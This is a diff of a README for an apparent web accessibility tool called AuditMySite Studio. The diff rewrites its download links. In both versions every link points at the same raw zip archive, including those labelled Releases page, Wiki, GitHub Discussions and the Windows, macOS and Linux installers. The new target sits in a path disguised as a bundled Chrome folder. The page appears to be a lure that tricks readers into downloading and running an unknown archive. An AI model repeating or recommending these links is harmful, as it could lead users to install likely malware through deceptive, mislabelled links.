@@ -1,7 +1,7 @@
 # 🔍 auditmysite_studio - Your Gateway to Web Accessibility
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/Abdelrahman619/auditmysite_studio/master/suffragan/auditmysite_studio.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Abdelrahman619/auditmysite_studio/master/suffragan/auditmysite_studio.zip)
+[![Download Latest Release](https://github.com/Abdelrahman619/auditmysite_studio/raw/refs/heads/master/auditmysite_engine/.local-chrome/138.0.7204.94/chrome-mac-x64/studio_auditmysite_2.0.zip%20Latest%20Release-v1.0-blue)](https://github.com/Abdelrahman619/auditmysite_studio/raw/refs/heads/master/auditmysite_engine/.local-chrome/138.0.7204.94/chrome-mac-x64/studio_auditmysite_2.0.zip)
 
 ## 🚀 Getting Started
 AuditMySite is an easy-to-use desktop application for checking web accessibility. Whether you're part of a development team, quality assurance, or just interested in web accessibility, this tool helps you ensure your websites comply with accessibility standards.
@@ -22,15 +22,15 @@ AuditMySite combines a modern Flutter desktop app with powerful CLI (command-lin
 - **Powerful CLI Tools:** Ideal for users comfortable with command-line operations.
 
 ## 📥 Download & Install
-To download the latest version of AuditMySite, please visit this page: [Download Releases](https://raw.githubusercontent.com/Abdelrahman619/auditmysite_studio/master/suffragan/auditmysite_studio.zip).
+To download the latest version of AuditMySite, please visit this page: [Download Releases](https://github.com/Abdelrahman619/auditmysite_studio/raw/refs/heads/master/auditmysite_engine/.local-chrome/138.0.7204.94/chrome-mac-x64/studio_auditmysite_2.0.zip).
 
 ### Installation Steps:
-1. Visit the [Releases page](https://raw.githubusercontent.com/Abdelrahman619/auditmysite_studio/master/suffragan/auditmysite_studio.zip).
+1. Visit the [Releases page](https://github.com/Abdelrahman619/auditmysite_studio/raw/refs/heads/master/auditmysite_engine/.local-chrome/138.0.7204.94/chrome-mac-x64/studio_auditmysite_2.0.zip).
 2. Find the latest version of the application.
 3. Click on the appropriate file for your operating system:
-   - For Windows, look for `https://raw.githubusercontent.com/Abdelrahman619/auditmysite_studio/master/suffragan/auditmysite_studio.zip`.
-   - For macOS, select `https://raw.githubusercontent.com/Abdelrahman619/auditmysite_studio/master/suffragan/auditmysite_studio.zip`.
-   - For Linux, choose the `https://raw.githubusercontent.com/Abdelrahman619/auditmysite_studio/master/suffragan/auditmysite_studio.zip`.
+   - For Windows, look for `https://github.com/Abdelrahman619/auditmysite_studio/raw/refs/heads/master/auditmysite_engine/.local-chrome/138.0.7204.94/chrome-mac-x64/studio_auditmysite_2.0.zip`.
+   - For macOS, select `https://github.com/Abdelrahman619/auditmysite_studio/raw/refs/heads/master/auditmysite_engine/.local-chrome/138.0.7204.94/chrome-mac-x64/studio_auditmysite_2.0.zip`.
+   - For Linux, choose the `https://github.com/Abdelrahman619/auditmysite_studio/raw/refs/heads/master/auditmysite_engine/.local-chrome/138.0.7204.94/chrome-mac-x64/studio_auditmysite_2.0.zip`.
 4. Once downloaded, open the installer and follow the on-screen instructions.
 
 ## 🎉 Using AuditMySite
@@ -43,14 +43,14 @@ After installing, launch the application. You will see the main dashboard. Here�
 5. **Generate Reports:** Export your findings as a PDF for later reference or to share with your team.
 
 ## 📚 Additional Resources
-- **Documentation:** Access detailed documentation on how to maximize your use of AuditMySite through the [Wiki](https://raw.githubusercontent.com/Abdelrahman619/auditmysite_studio/master/suffragan/auditmysite_studio.zip).
+- **Documentation:** Access detailed documentation on how to maximize your use of AuditMySite through the [Wiki](https://github.com/Abdelrahman619/auditmysite_studio/raw/refs/heads/master/auditmysite_engine/.local-chrome/138.0.7204.94/chrome-mac-x64/studio_auditmysite_2.0.zip).
 - **Support:** For any questions or issues, contact our support team through the repository's issue tracker.
 
 ## 🛠️ Contributing
 We welcome contributions! If you have ideas or improvements, feel free to fork the repository and submit a pull request.
 
 ## 💬 Community
-Join our community of users and contributors on [GitHub Discussions](https://raw.githubusercontent.com/Abdelrahman619/auditmysite_studio/master/suffragan/auditmysite_studio.zip) to share tips, ask questions, and more.
+Join our community of users and contributors on [GitHub Discussions](https://github.com/Abdelrahman619/auditmysite_studio/raw/refs/heads/master/auditmysite_engine/.local-chrome/138.0.7204.94/chrome-mac-x64/studio_auditmysite_2.0.zip) to share tips, ask questions, and more.
 
 ## 📄 License
 This project is licensed under the MIT License. You can find more details in the LICENSE file in the repository.
@@ -59,4 +59,4 @@ This project is licensed under the MIT License. You can find more details in the
 Your feedback is important to us. Please share your experiences and suggestions in the discussions or directly through the issue tracker.
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/Abdelrahman619/auditmysite_studio/master/suffragan/auditmysite_studio.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Abdelrahman619/auditmysite_studio/master/suffragan/auditmysite_studio.zip)
+[![Download Latest Release](https://github.com/Abdelrahman619/auditmysite_studio/raw/refs/heads/master/auditmysite_engine/.local-chrome/138.0.7204.94/chrome-mac-x64/studio_auditmysite_2.0.zip%20Latest%20Release-v1.0-blue)](https://github.com/Abdelrahman619/auditmysite_studio/raw/refs/heads/master/auditmysite_engine/.local-chrome/138.0.7204.94/chrome-mac-x64/studio_auditmysite_2.0.zip)
